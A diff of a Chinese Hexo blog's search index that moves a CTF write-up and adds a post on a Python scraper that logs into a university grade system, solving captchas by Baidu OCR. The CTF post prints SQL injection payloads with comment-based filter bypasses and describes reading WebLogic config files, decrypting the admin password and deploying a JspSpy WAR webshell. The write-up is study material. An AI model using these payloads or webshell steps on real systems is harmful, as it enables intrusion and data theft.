+<h2 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h2><h3 id="模拟登录"><a href="#模拟登录" class="headerlink" title="模拟登录"></a>模拟登录</h3><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>一共写了两个版本，一个是使用selenium的SlowLogin，看名字就看出来了，这个登录的慢<br>而且需要配置webdriver，登录一次大约需要8-10秒钟；另一个是基于requests的<br>FastLogin，这个顾名思义就相当的快了，登录一次不到五秒钟，速度飞起，而且可能我用的<br>vpn比较卡，在校园网上应该能更快。</p>
+<p>两个版本可以自由切换,在config中设置即可，更改login即可</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">opinions:</span><br><span class="line">  - login: <span class="string">&#x27;fast&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>两个模拟登录都可以直接返回成功登录之后的cookie，可以用来爬之后的界面，非常适合二次开发，欢迎二次开发，最好给个star :)</p>
+<h4 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h4><p>先说SlowLogin，比较无脑，获得输入框的xpath，然后直接sendkeys，这里有个比较麻烦<br>的就是验证码的问题，这里我用了webdriver的screenshot方法，将图片保存到本地，然后调用<br>百度的ocr，要花钱(5555)，而且存在识别错现象。因为本来就不是很智能，用人眼看填验证码的话<br>就更不智能了。</p>
+<p>FastLogin这个就非常智能，模拟了发包过程，通过分析登录操作可以知道，先get RSA的公钥再get验证码，分析前端加密js可知，是通过rsa对password进行了加密，我们可以用简单的用python模拟，考虑到搭建环境太复杂，这里是模拟的，没有用exejs和node.js，因此耗费了很长时间，其中jsFunction模拟了js中对RSA的加密。由于get的验证码是二进制文件<br>我们可以直接将其写入文件中，然后调用baiduocr的api识别，或者人工识别，两个函数在FastLogin中可以自由选择，可以通过config.yml进行设置</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 智能人工识别验证码</span></span><br><span class="line">code = get_code_by_people(sessions)</span><br><span class="line"><span class="comment"># 人工智能识别验证码</span></span><br><span class="line">code = get_code_by_ocr(sessions)</span><br></pre></td></tr></table></figure>
+<p>config如下</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">opinions:</span><br><span class="line">  - AI: true</span><br></pre></td></tr></table></figure>
+<p>调用人工识别函数的时候比较有趣，如下，会弹出窗口，然后人工识别</p>
+<p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/20210916224421.png"></p>
+<p>可以看到成功获得了cookie</p>
+<p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/20210916224809.png"></p>
+<p>ocr识别的话，如下</p>
+<p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/20210916225044.png"></p>
+<p>可以看到，只识别了一次，如果识别错误的话，会自动重新登录，直到登录成功</p>
+<h3 id="爬取成绩"><a href="#爬取成绩" class="headerlink" title="爬取成绩"></a>爬取成绩</h3><p>分析抓包即可，页面逻辑比较简单，post后返回的是json数据，解析，保存成了字典，{科目=&gt;[平时分，期末分，总分，学分，绩点]}，因为获得平时分时需要每一科都请求一次，因此速度比较慢，其中也有一些选项，自己探索吧，懒得写了，睡觉！</p>
+<p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/20210916230422.png"></p>
+<p>一些设置如下，需要保存在config.yml中</p>
+<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">user:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">id:</span> <span class="string">&#x27;xxxxxxxx&#x27;</span> <span class="string">学号</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">password:</span> <span class="string">&#x27;xxxxxxxxxx&#x27;</span> <span class="string">密码</span></span><br><span class="line"><span class="attr">ocr:</span> <span class="string">百度识图的api</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">key:</span> <span class="string">&#x27;xxxxxxxxxxx&#x27;</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">secret:</span> <span class="string">&#x27;xxxxxxxxxxxxxxxx&#x27;</span></span><br><span class="line"><span class="attr">opinions:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">AI:</span> <span class="literal">true</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">login:</span> <span class="string">&#x27;fast&#x27;</span></span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>python实践</category>
+      </categories>
+      <tags>
+        <tag>python</tag>
+        <tag>爬虫</tag>
       </tags>
   </entry>
   <entry>
@@ -2087,6 +2093,35 @@ e.g. http://192.168.xxx.xxx:100/ezyii/
       </tags>
   </entry>
   <entry>
+    <title>国庆赛部分赛题复现</title>
+    <url>/posts/bfdb9200/</url>
+    <content><![CDATA[<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="sql2"><a href="#sql2" class="headerlink" title="sql2"></a>sql2</h3><blockquote>
+<p>环境有点问题，复现一半出不来了</p>
+</blockquote>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">查库名</span><br><span class="line">username<span class="operator">=</span>admin<span class="operator">&amp;</span>passwd<span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">27</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>group_concat(db),<span class="number">2</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>sys.schema_object_overview#</span><br><span class="line"></span><br><span class="line">查表名</span><br><span class="line"></span><br><span class="line">username<span class="operator">=</span>admin<span class="operator">&amp;</span>passwd<span class="operator">=</span>admin<span class="string">&#x27;/**/union/**/select/**/group_concat(table_name),2/**/from/**/sys.schema_table_statistics/**/where/**/table_schema=&#x27;</span>flagisHere<span class="string">&#x27;#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">无列名注入</span></span><br><span class="line"><span class="string">username=admin&amp;passwd=admin&#x27;</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>(<span class="keyword">select</span><span class="comment">/**/</span>group_concat(a)<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>(<span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="comment">/**/</span><span class="keyword">as</span><span class="comment">/**/</span>a<span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="operator">*</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>flagisHere.flAg</span><br></pre></td></tr></table></figure>
+
+<h3 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h3><p>按照wp的反弹shell没打通</p>
+<h3 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h3><p>这个题学到的挺多的</p>
+<p>先通过任意文件读取漏洞获得密钥和密文</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;config&#x2F;config.xml</span><br><span class="line">.&#x2F;security&#x2F;SerializedSystemIni.dat</span><br></pre></td></tr></table></figure>
+
+<p>然后用这个<a href="https://github.com/TideSec/Decrypt_Weblogic_Password">https://github.com/TideSec/Decrypt_Weblogic_Password</a>文章中提到的，获得密码，登入后台，部署木马。</p>
+<p>war木马，就是将jsp木马压缩成zip，然后改后缀就行，这里把war部署到服务器上。</p>
+<p>访问大马文件<a href="http://host/test/JspSpy.jsp">http://host/test/JspSpy.jsp</a></p>
+<p>找到个flag.tar，结果我解压的时候给破坏了，现在服务器里没flag了，它这个是所有人一个环境，后面复现的人得多少有点懵逼，所以：</p>
+<p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/20211013215350.png"></p>
+<p>我在根目录里面创建了个假的flag（哈哈哈，逃</p>
+]]></content>
+      <categories>
+        <category>ctf学习</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>web</tag>
+        <tag>sql注入</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>文件上传总结</title>
     <url>/posts/ea42f6a6/</url>
     <content><![CDATA[<h2 id="基本思路"><a href="#基本思路" class="headerlink" title="基本思路"></a>基本思路</h2><ol>
@@ -2163,35 +2198,6 @@ e.g. http://192.168.xxx.xxx:100/ezyii/
       <tags>
         <tag>web</tag>
         <tag>文件上传</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>国庆赛部分赛题复现</title>
-    <url>/posts/bfdb9200/</url>
-    <content><![CDATA[<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="sql2"><a href="#sql2" class="headerlink" title="sql2"></a>sql2</h3><blockquote>
-<p>环境有点问题，复现一半出不来了</p>
-</blockquote>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">查库名</span><br><span class="line">username<span class="operator">=</span>admin<span class="operator">&amp;</span>passwd<span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">27</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>group_concat(db),<span class="number">2</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>sys.schema_object_overview#</span><br><span class="line"></span><br><span class="line">查表名</span><br><span class="line"></span><br><span class="line">username<span class="operator">=</span>admin<span class="operator">&amp;</span>passwd<span class="operator">=</span>admin<span class="string">&#x27;/**/union/**/select/**/group_concat(table_name),2/**/from/**/sys.schema_table_statistics/**/where/**/table_schema=&#x27;</span>flagisHere<span class="string">&#x27;#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">无列名注入</span></span><br><span class="line"><span class="string">username=admin&amp;passwd=admin&#x27;</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>(<span class="keyword">select</span><span class="comment">/**/</span>group_concat(a)<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>(<span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="comment">/**/</span><span class="keyword">as</span><span class="comment">/**/</span>a<span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="operator">*</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>flagisHere.flAg</span><br></pre></td></tr></table></figure>
-
-<h3 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h3><p>按照wp的反弹shell没打通</p>
-<h3 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h3><p>这个题学到的挺多的</p>
-<p>先通过任意文件读取漏洞获得密钥和密文</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;config&#x2F;config.xml</span><br><span class="line">.&#x2F;security&#x2F;SerializedSystemIni.dat</span><br></pre></td></tr></table></figure>
-
-<p>然后用这个<a href="https://github.com/TideSec/Decrypt_Weblogic_Password">https://github.com/TideSec/Decrypt_Weblogic_Password</a>文章中提到的，获得密码，登入后台，部署木马。</p>
-<p>war木马，就是将jsp木马压缩成zip，然后改后缀就行，这里把war部署到服务器上。</p>
-<p>访问大马文件<a href="http://host/test/JspSpy.jsp">http://host/test/JspSpy.jsp</a></p>
-<p>找到个flag.tar，结果我解压的时候给破坏了，现在服务器里没flag了，它这个是所有人一个环境，后面复现的人得多少有点懵逼，所以：</p>
-<p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/20211013215350.png"></p>
-<p>我在根目录里面创建了个假的flag（哈哈哈，逃</p>
-]]></content>
-      <categories>
-        <category>ctf学习</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>web</tag>
-        <tag>sql注入</tag>
       </tags>
   </entry>
   <entry>
